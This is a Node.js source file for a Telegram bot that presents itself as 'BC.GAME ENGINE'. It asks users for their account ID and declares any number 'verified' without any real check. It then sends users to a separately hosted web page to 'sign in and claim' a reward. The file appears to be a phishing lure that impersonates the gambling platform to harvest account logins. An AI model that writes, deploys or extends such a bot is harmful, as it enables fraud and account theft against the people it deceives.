const { Telegraf, Markup } = require('telegraf');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);

// Ensure URL ends with slash
let webUrl = process.env.WEBAPP_URL || 'https://telegrambot-navy.vercel.app/';
if (!webUrl.endsWith('/')) webUrl += '/';

const profileImg = `${webUrl}profile.png`;
const engineImg = `${webUrl}engine.png`;

bot.start(async (ctx) => {
    try {
        console.log('Sending start photo:', profileImg);
        await ctx.replyWithPhoto(profileImg, {
            caption: `<b>Welcome to BC.GAME ENGINE</b>\n\nTo continue, please provide your BC.GAME User ID (UID) to verify your account.`,
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
            ])
        });
    } catch (e) {
        console.error('Bot photo error:', e.message);
        ctx.reply('Welcome! Please enter your User ID to continue.');
    }
});

bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    
    if (/^\d+$/.test(text)) {
        try {
            await ctx.replyWithPhoto(engineImg, {
                caption: `<b>UID Verified: ${text}</b>\n\nYou are now eligible to claim your reward. Click the button below to sign in and claim.`,
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.webApp('Claim Reward', webUrl)]
                ])
            });
        } catch (e) {
            ctx.reply(`UID Verified: ${text}\nClick below to claim your reward.`, Markup.inlineKeyboard([
                [Markup.button.webApp('Claim Reward', webUrl)]
            ]));
        }
    } else {
        ctx.reply('Please enter a valid numeric User ID.');
    }
});

bot.launch().then(() => console.log('Bot is running...'));
